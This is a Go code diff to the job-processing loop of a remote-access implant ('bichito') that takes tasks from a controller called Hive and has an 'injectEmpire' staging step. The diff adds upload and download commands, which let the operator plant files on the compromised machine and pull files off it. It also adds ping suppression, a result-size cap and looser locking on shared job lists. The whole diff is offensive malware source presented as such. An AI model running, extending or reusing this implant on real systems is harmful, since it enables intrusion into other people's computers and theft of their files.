@@ -10,9 +10,13 @@ import (
 	"bichito/modules/biterpreter"
 	"time"
 	"strconv"
+	"strings"
+	//Debug
+	"fmt"
+
 )
 
-
+var received bool = false
 
 // Process Implant Jobs to be executed in Bot Machine
 // A. Define a timeout to finish the Jobs and don't let the Implant hanging
@@ -22,10 +26,10 @@ import (
 func jobProcessor(){
 
 	//Lock shared Slice
-	jobsToProcess.mux.Lock()
-	defer jobsToProcess.mux.Unlock()
+	//jobsToProcess.mux.RLock()
 
-	if len(jobsToProcess.Jobs) == 0 {
+	if ((len(jobsToProcess.Jobs) == 0) && (!received)) {
+		
 		ping := Job{"","","",bid,"BiPing","","","",""}
 		jobsToHive.mux.Lock()
 		defer jobsToHive.mux.Unlock()
@@ -38,13 +42,22 @@ func jobProcessor(){
 	var result,timeR string
 	var error bool
 	
-	for i,job := range jobsToProcess.Jobs{
+	for _,job := range jobsToProcess.Jobs{
+
+		//Debug:
+		//fmt.Println(job.Job)
+		//Stop buffering pings once we know we are in Hive DB (to reduce overhead)
+		if job.Job == "received"{
+			received = true
+			break
+		}
 
 		go func() {
 		  	
 		   	switch job.Job{
 		   	
 		   		// Implant Lifecycle
+		   		
 		   		case "respTime":
 
 		   			i, err := strconv.Atoi(job.Parameters)
@@ -123,7 +136,28 @@ func jobProcessor(){
 					}
 		   			contChannel <- "continue"
 
+		   		case "upload":
+		   			
+		   			arguments := strings.Split(job.Parameters," ")
+		   			destinyPath := arguments[1]
+		   			blob := job.Result 
+		   			//Debug:
+		   			//fmt.Println(len(blob))
+		   			error,result = biterpreter.Upload(destinyPath,blob)
+		   			if error{
+						result = "Error Executing Command:"+ result
+					}
+		   			contChannel <- "continue"
 
+		   		case "download":
+		   			
+		   			arguments := strings.Split(job.Parameters," ")
+		   			destinyPath := arguments[0]
+		   			error,result = biterpreter.Download(destinyPath)
+		   			if error{
+						result = "Error Executing Command:"+ result
+					}
+		   			contChannel <- "continue"
 
 		   		//Staging/POST Actions
 		   		case "injectEmpire":
@@ -145,8 +179,20 @@ func jobProcessor(){
 			case <- contChannel:
 						
 		   			timeR = time.Now().Format("02/01/2006 15:04:05 MST")
-					job.Result = result
-					job.Status = "Success"
+		   			
+		   			//Check that the size of the Result doesn't exceed 20 MB
+		   			bytesResult := len(result)
+					//Debug: Job size
+		   			//fmt.Println("Job Result Size:")
+		   			//fmt.Println(bytesResult)
+					if (bytesResult >= 20000000){
+						job.Result = "Too Big payload, use staging channel for these sizes"
+						job.Status = "Error"
+					}else{
+						job.Result = result
+						job.Status = "Success"	
+					}
+
 					job.Time = timeR
 
 					jobsToHive.mux.Lock()
@@ -162,14 +208,20 @@ func jobProcessor(){
 
 					jobsToHive.mux.Lock()
 		   			jobsToHive.Jobs = append(jobsToHive.Jobs,job)
-		   			jobsToProcess.Jobs = jobsToProcess.Jobs[i+1:]
 		   			jobsToHive.mux.Unlock()
-		   			return
+
+		   			biJobTimeout.Reset(time.Duration(10) * time.Second)
+		   			//Reset timeout and continue with next one
+		   			//jobsToProcess.Jobs = jobsToProcess.Jobs[i+1:]
+		   			//return
 		}
 
 	}
+	//jobsToProcess.mux.RUnlock()
 
 	//Clean all processed jobs
+	jobsToProcess.mux.Lock()
 	jobsToProcess.Jobs = jobsToProcess.Jobs[:0]
+	jobsToProcess.mux.Unlock()
 	return
 }
